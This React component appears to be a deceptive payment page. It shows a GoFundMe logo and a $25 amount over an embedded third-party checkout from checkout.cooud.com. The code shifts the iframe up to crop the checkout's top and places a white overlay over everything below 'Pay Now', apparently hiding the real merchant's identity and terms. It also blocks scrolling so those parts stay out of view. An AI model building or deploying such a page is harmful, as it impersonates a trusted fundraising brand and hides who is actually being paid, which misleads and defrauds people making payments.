import { useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";

const CHECKOUT_BASE_URL = "https://checkout.cooud.com/01KM1T61B2SNEXF045XRB31JPV";
const TOP_CROP = 170;

const Index = () => {
  const [searchParams] = useSearchParams();
  const iframeContainerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const original = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    document.documentElement.style.overflow = "hidden";

    const blockScroll = (e: Event) => {
      e.preventDefault();
      e.stopPropagation();
    };

    const container = iframeContainerRef.current;
    if (container) {
      container.addEventListener("wheel", blockScroll, { passive: false });
      container.addEventListener("touchmove", blockScroll, { passive: false });
    }

    return () => {
      document.body.style.overflow = original;
      document.documentElement.style.overflow = "";
      if (container) {
        container.removeEventListener("wheel", blockScroll);
        container.removeEventListener("touchmove", blockScroll);
      }
    };
  }, []);

  const checkoutUrl = (() => {
    const params = searchParams.toString();
    return params ? `${CHECKOUT_BASE_URL}?${params}` : CHECKOUT_BASE_URL;
  })();

  return (
    <div
      style={{
        width: "100%",
        height: "100vh",
        display: "flex",
        flexDirection: "column",
        backgroundColor: "#f8f8f8",
        overflow: "hidden",
      }}
    >
      {/* Header com logo GoFundMe e informacoes */}
      <div
        style={{
          width: "100%",
          flexShrink: 0,
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          paddingTop: "24px",
          paddingBottom: "20px",
          backgroundColor: "#fff",
          borderBottom: "1px solid #e5e5e5",
        }}
      >
        <div
          style={{
            width: "90%",
            maxWidth: "420px",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            gap: "16px",
          }}
        >
          <img
            src="/gofundme-logo.png"
            alt="GoFundMe"
            style={{
              height: "28px",
              objectFit: "contain",
            }}
          />
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: "8px",
            }}
          >
            <span
              style={{
                fontSize: "22px",
                fontWeight: 700,
                color: "#02a95c",
                letterSpacing: "-0.01em",
              }}
            >
              $25
            </span>
            <span
              style={{
                fontSize: "13px",
                fontWeight: 500,
                color: "#6b7280",
              }}
            >
              one-time
            </span>
          </div>
        </div>
      </div>

      {/* Iframe do checkout */}
      <div
        ref={iframeContainerRef}
        style={{
          position: "relative",
          flex: 1,
          overflow: "hidden",
        }}
      >
        <iframe
          src={checkoutUrl}
          title="Checkout"
          style={{
            position: "absolute",
            top: `-${TOP_CROP}px`,
            left: 0,
            width: "100%",
            height: `calc(100% + ${TOP_CROP}px)`,
            border: "none",
          }}
          allow="payment *; clipboard-write"
          sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation allow-popups-to-escape-sandbox"
        />
        {/* Sobreposição branca fixa na parte inferior — cobre tudo abaixo do Pay Now */}
        <div
          style={{
            position: "fixed",
            bottom: 0,
            left: 0,
            width: "100%",
            height: "150px",
            backgroundColor: "#ffffff",
            zIndex: 10,
            pointerEvents: "none",
          }}
        />
      </div>
    </div>
  );
};

export default Index;
